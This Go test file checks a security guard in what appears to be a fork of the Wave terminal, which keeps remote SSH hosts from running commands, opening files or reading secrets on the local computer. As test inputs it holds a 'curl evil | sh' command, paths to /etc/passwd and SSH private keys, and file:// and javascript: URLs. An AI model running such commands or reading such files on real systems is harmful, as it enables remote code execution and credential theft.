// Copyright 2026, DiamondForge
// SPDX-License-Identifier: AGPL-3.0-only

package metaguard

import (
	"strings"
	"testing"

	"github.com/wavetermdev/waveterm/pkg/molten"
	"github.com/wavetermdev/waveterm/pkg/waveobj"
	"github.com/wavetermdev/waveterm/pkg/wconfig"
)

var sshHost = Remote{Conn: "dev@build.example"}

// thisComputer: the connections that run on this computer.
var thisComputer = []string{"", "local", "local:gitbash", "wsl://Ubuntu"}

func mustRefuse(t *testing.T, name string, err error) {
	t.Helper()
	if err == nil {
		t.Errorf("%s: accepted", name)
		return
	}
	if !strings.HasPrefix(err.Error(), "refused:") || !strings.HasSuffix(err.Error(), RemoteHint) {
		t.Errorf("%s: %q is not a refusal that says why and where to do it", name, err)
	}
}

func mustAccept(t *testing.T, name string, err error) {
	t.Helper()
	if err != nil {
		t.Errorf("%s: %v", name, err)
	}
}

// #1831: a cmd or shell block an SSH host created without a connection ran on this computer. A block meant for this
// computer runs on the host's own connection; one on an SSH server keeps it (wsh ssh -n).
func TestRemoteCreateMetaForcesTheHostConnection(t *testing.T) {
	forced := []waveobj.MetaMapType{
		{waveobj.MetaKey_View: "term", waveobj.MetaKey_Controller: "cmd", waveobj.MetaKey_Cmd: "curl evil | sh"},
		{waveobj.MetaKey_View: "term", waveobj.MetaKey_Controller: "shell"},
		{waveobj.MetaKey_View: "term", waveobj.MetaKey_Controller: "cmd", waveobj.MetaKey_Connection: "local"},
		{waveobj.MetaKey_View: "term", waveobj.MetaKey_Controller: "shell", waveobj.MetaKey_Connection: "wsl://Ubuntu"},
		{waveobj.MetaKey_View: "preview", waveobj.MetaKey_File: "/etc/passwd"},
		nil,
	}
	for i, meta := range forced {
		got, err := RemoteCreateMeta(sshHost, meta)
		if err != nil {
			t.Fatalf("case %d: %v", i, err)
		}
		if got[waveobj.MetaKey_Connection] != sshHost.Conn {
			t.Errorf("case %d: connection %v, want %q", i, got[waveobj.MetaKey_Connection], sshHost.Conn)
		}
		for key, value := range meta {
			if key != waveobj.MetaKey_Connection && got[key] != value {
				t.Errorf("case %d: %s changed to %v", i, key, got[key])
			}
		}
	}
	if forced[2][waveobj.MetaKey_Connection] != "local" {
		t.Error("the request's own meta was changed in place")
	}
	hop := waveobj.MetaMapType{waveobj.MetaKey_View: "term", waveobj.MetaKey_Controller: "shell", waveobj.MetaKey_Connection: "other@host"}
	if got, err := RemoteCreateMeta(sshHost, hop); err != nil || got[waveobj.MetaKey_Connection] != "other@host" {
		t.Errorf("wsh ssh -n to another server: %v %v", got, err)
	}
	if _, err := RemoteCreateMeta(Remote{}, hop); err != nil {
		t.Errorf("a host with no known connection opening a server's shell: %v", err)
	}
	_, err := RemoteCreateMeta(Remote{}, waveobj.MetaMapType{waveobj.MetaKey_Controller: "cmd"})
	mustRefuse(t, "a host with no known connection", err)
	_, err = RemoteCreateMeta(sshHost, waveobj.MetaMapType{waveobj.MetaKey_Controller: tsunamiController})
	mustRefuse(t, "a tsunami controller", err)
}

// wsh web open and wsh view of a page keep working; file:// and other schemes would open this computer's files.
func TestRemoteWebAddresses(t *testing.T) {
	for _, page := range []string{"https://example.com/docs", "http://localhost:3000"} {
		_, err := RemoteCreateMeta(sshHost, waveobj.MetaMapType{waveobj.MetaKey_View: molten.BrowserView, waveobj.MetaKey_Url: page})
		mustAccept(t, page, err)
	}
	for _, page := range []string{"file:///etc/passwd", "FILE:///Users/me/.ssh/id_ed25519", "javascript:alert(1)", "/etc/passwd", "chrome://settings"} {
		_, err := RemoteCreateMeta(sshHost, waveobj.MetaMapType{waveobj.MetaKey_View: molten.BrowserView, waveobj.MetaKey_Url: page})
		mustRefuse(t, "create "+page, err)
		err = CheckRemoteMetaWrite(sshHost, waveobj.MakeORef(waveobj.OType_Block, "local-browser"), "", molten.BrowserOpenRequestMeta("id1", page))
		mustRefuse(t, "queue "+page, err)
		err = CheckRemoteMetaWrite(sshHost, waveobj.MakeORef(waveobj.OType_Block, "local-browser"), "", molten.BrowserHandoffRequestMeta("id1", page, "chrome"))
		mustRefuse(t, "queue object "+page, err)
	}
	err := CheckRemoteMetaWrite(sshHost, waveobj.MakeORef(waveobj.OType_Block, "local-browser"), "", molten.BrowserOpenRequestMeta("id1", "https://example.com"))
	mustAccept(t, "wsh web open into a local browser panel", err)
}

// On a block of this computer a host only queues pages; on its own or a server's, it writes Wave's keys but cannot
// move the block onto this computer.
func TestRemoteMetaWrite(t *testing.T) {
	local := waveobj.MakeORef(waveobj.OType_Block, "local-term")
	own := waveobj.MakeORef(waveobj.OType_Block, "own-term")
	for _, conn := range thisComputer {
		for name, meta := range map[string]waveobj.MetaMapType{
			"cmd on a local block":        {waveobj.MetaKey_Controller: "cmd", waveobj.MetaKey_Cmd: "id"},
			"connection on a local block": {waveobj.MetaKey_Connection: sshHost.Conn},
			"file on a local preview":     {waveobj.MetaKey_File: "/etc/passwd"},
		} {
			mustRefuse(t, name+" "+conn, CheckRemoteMetaWrite(sshHost, local, conn, meta))
		}
	}
	mustRefuse(t, "unknown host on a local block", CheckRemoteMetaWrite(Remote{}, own, "", waveobj.MetaMapType{waveobj.MetaKey_Cmd: "id"}))
	mustAccept(t, "cmd on its own block", CheckRemoteMetaWrite(sshHost, own, sshHost.Conn, waveobj.MetaMapType{waveobj.MetaKey_Controller: "cmd", waveobj.MetaKey_Cmd: "make"}))
	mustAccept(t, "default port", CheckRemoteMetaWrite(sshHost, own, sshHost.Conn+":22", waveobj.MetaMapType{waveobj.MetaKey_Cmd: "make"}))
	mustAccept(t, "wsh ssh to another server", CheckRemoteMetaWrite(sshHost, own, sshHost.Conn, waveobj.MetaMapType{waveobj.MetaKey_Connection: "other@host"}))
	mustAccept(t, "a server's block", CheckRemoteMetaWrite(sshHost, local, "other@host", waveobj.MetaMapType{waveobj.MetaKey_Cmd: "make"}))
	for _, conn := range thisComputer {
		mustRefuse(t, "move its block onto "+conn, CheckRemoteMetaWrite(sshHost, own, sshHost.Conn, waveobj.MetaMapType{waveobj.MetaKey_Connection: conn}))
	}
	mustRefuse(t, "tsunami on its block", CheckRemoteMetaWrite(sshHost, own, sshHost.Conn, waveobj.MetaMapType{waveobj.MetaKey_Controller: tsunamiController}))
	mustAccept(t, "tab background", CheckRemoteMetaWrite(sshHost, waveobj.MakeORef(waveobj.OType_Tab, "t"), "", waveobj.MetaMapType{"bg": "red"}))
	mustRefuse(t, "client meta", CheckRemoteMetaWrite(sshHost, waveobj.MakeORef(waveobj.OType_Client, "c"), "", waveobj.MetaMapType{"x": 1}))
	mustRefuse(t, "window meta", CheckRemoteMetaWrite(sshHost, waveobj.MakeORef(waveobj.OType_Window, "w"), "", waveobj.MetaMapType{"x": 1}))
}

func TestRemoteBlockControl(t *testing.T) {
	for _, conn := range thisComputer {
		mustRefuse(t, "resync on "+conn, CheckRemoteBlock(sshHost, conn, "restart"))
	}
	mustAccept(t, "own block", CheckRemoteBlock(sshHost, sshHost.Conn, "restart"))
	mustAccept(t, "a server's block", CheckRemoteBlock(sshHost, "other@host", "restart"))
	mustRefuse(t, "unknown host", CheckRemoteBlock(Remote{}, "", "restart"))
	wsl := Remote{Conn: "wsl://Ubuntu"}
	mustAccept(t, "wsl own block", CheckRemoteBlock(wsl, "wsl://Ubuntu", "type into"))
	mustRefuse(t, "wsl another distribution", CheckRemoteBlock(wsl, "wsl://Debian", "type into"))
}

// A bare path resolves to wavesrv's current host, this computer; wsh://local is this computer.
func TestRemotePaths(t *testing.T) {
	for _, path := range []string{"/etc/passwd", "~/.ssh/id_ed25519", "wsh://local/etc/passwd", "wsh:///etc/passwd", "//local/etc/hosts", "wsh://wsl://Ubuntu/etc/passwd", "wavefile://block/term", "wsh://current/etc/passwd", ""} {
		mustRefuse(t, path, CheckRemotePath(sshHost, path))
	}
	for _, path := range []string{"wsh://dev@build.example/home/dev/notes.txt", "wsh://dev@build.example/~/notes.txt", "//dev@build.example/tmp/x", "wsh://other@host/tmp/x"} {
		mustAccept(t, path, CheckRemotePath(sshHost, path))
	}
	mustAccept(t, "wsl path", CheckRemotePath(Remote{Conn: "wsl://Ubuntu"}, "wsh://wsl://Ubuntu/home/me/x"))
	mustRefuse(t, "unknown host, local path", CheckRemotePath(Remote{}, "wsh://local/x"))
}

func TestRemoteCommandsAndConnections(t *testing.T) {
	for command := range RemoteRefusedCommands {
		mustRefuse(t, command, CheckRemoteCommand(command))
	}
	for _, command := range []string{"createblock", "setmeta", "getmeta", "eventpublish", "message"} {
		mustAccept(t, command, CheckRemoteCommand(command))
	}
	for _, conn := range thisComputer {
		mustRefuse(t, "act on "+conn, CheckRemoteConn(sshHost, conn, "start a job on"))
	}
	mustAccept(t, "another server", CheckRemoteConn(sshHost, "other@host", "connect to"))
	mustAccept(t, "its own connection", CheckRemoteConn(sshHost, sshHost.Conn, "connect to"))
}

// #2119: a host ran `wsh secret list|get|set` and read or replaced this computer's secrets (AI keys, the passwords of
// the other servers), read AI tokens through the config events, and read a local app build's environment.
func TestRemoteSecretsTokensAndBuilds(t *testing.T) {
	for _, command := range []string{"getsecrets", "getsecretsnames", "setsecrets"} {
		err := CheckRemoteCommand(command)
		mustRefuse(t, command, err)
		if err != nil && !strings.Contains(err.Error(), "secrets stay on it") {
			t.Errorf("%s: %q does not say why", command, err)
		}
	}
	for _, command := range []string{"getrtinfo", "setrtinfo", "getbuilderoutput", "getbuilderstatus"} {
		mustRefuse(t, command, CheckRemoteCommand(command))
	}
	mustAccept(t, "secret storage backend", CheckRemoteCommand("getsecretslinuxstoragebackend"))
	for _, event := range []string{"config", "waveai:modeconfig", "userinput", "builderoutput", "builderstatus"} {
		err := CheckRemoteSubscribe(event)
		mustRefuse(t, event, err)
		if err != nil && !strings.Contains(err.Error(), "they carry") {
			t.Errorf("%s: %q does not say why", event, err)
		}
	}
	for _, event := range []string{"blockclose", "badge", "sysinfo", "route:up", "molten:agentstate"} {
		mustAccept(t, event, CheckRemoteSubscribe(event))
	}
	modes := map[string]wconfig.AIModeConfigType{"m": {APIToken: "sk-1", APITokenSecretName: "OPENAI_KEY", Model: "gpt"}}
	listed := RemoteListedAIModes(modes)
	if listed["m"].APIToken != "" || listed["m"].APITokenSecretName != "OPENAI_KEY" || listed["m"].Model != "gpt" {
		t.Fatalf("listed modes %+v", listed)
	}
	if modes["m"].APIToken != "sk-1" {
		t.Fatal("the stored modes were changed")
	}
	if RemoteListedAIModes(nil) != nil {
		t.Fatal("no modes became some")
	}
}

func TestIsLoopbackConn(t *testing.T) {
	for _, conn := range []string{"localhost", "me@localhost", "me@localhost:2222", "LOCALHOST.", "127.0.0.1", "root@127.1.2.3:22", "::1", "[::1]:22", "me@[::1]", "0.0.0.0", "app.localhost"} {
		if !IsLoopbackConn(conn) {
			t.Errorf("%s is this computer", conn)
		}
	}
	for _, conn := range []string{"dev@build.example", "10.0.0.5", "me@192.168.1.10:2222", "[2001:db8::1]:22", "localhosting.example"} {
		if IsLoopbackConn(conn) {
			t.Errorf("%s is not this computer", conn)
		}
	}
}

func TestLocalPathAndPathHost(t *testing.T) {
	for uri, want := range map[string]string{"/etc/passwd": "/etc/passwd", "wsh://local/~/x": "~/x", "wsh://current/tmp/x": "/tmp/x", "//local/etc/hosts": "etc/hosts"} {
		if got, ok := LocalPath(uri); !ok || got != want {
			t.Errorf("LocalPath(%q) = %q %v, want %q", uri, got, ok, want)
		}
	}
	for _, uri := range []string{"wsh://dev@build.example/x", "wavefile://b/term", "wsh://wsl://Ubuntu/x"} {
		if _, ok := LocalPath(uri); ok {
			t.Errorf("%s is not a path of this computer", uri)
		}
	}
	if host, ok := PathHost("wsh://other@host/tmp/x"); !ok || host != "other@host" {
		t.Errorf("PathHost: %q %v", host, ok)
	}
	if _, ok := PathHost("wsh://local/tmp/x"); ok {
		t.Error("PathHost named this computer")
	}
	if !OtherServer(sshHost, "other@host") || OtherServer(sshHost, sshHost.Conn+":22") || OtherServer(sshHost, "local") || OtherServer(sshHost, "wsl://Ubuntu") {
		t.Error("OtherServer")
	}
}
